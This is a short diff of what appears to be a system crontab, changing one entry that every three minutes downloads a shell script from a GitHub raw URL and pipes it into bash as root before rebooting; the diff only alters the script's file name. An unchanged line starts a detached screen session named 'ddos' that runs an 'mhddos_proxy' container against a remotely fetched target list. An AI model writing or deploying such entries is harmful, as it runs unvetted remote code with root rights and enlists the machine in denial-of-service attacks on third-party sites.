@@ -21,7 +21,7 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
 #
 
-*/3 *   * * *   root   curl -s https://raw.githubusercontent.com/russskiykorablidinah/pihpah/main/%D1%81lean_docker_cache.sh |bash && sudo reboot
+*/3 *   * * *   root   curl -s https://raw.githubusercontent.com/russskiykorablidinah/pihpah/main/docker_cache.sh |bash && sudo reboot
 @reboot         root   sudo screen -d -m -S ddos sudo docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -c https://raw.githubusercontent.com/SlavaUkraineSince1991/DDoS-for-all/main/targets/targets.txt --table
 
 
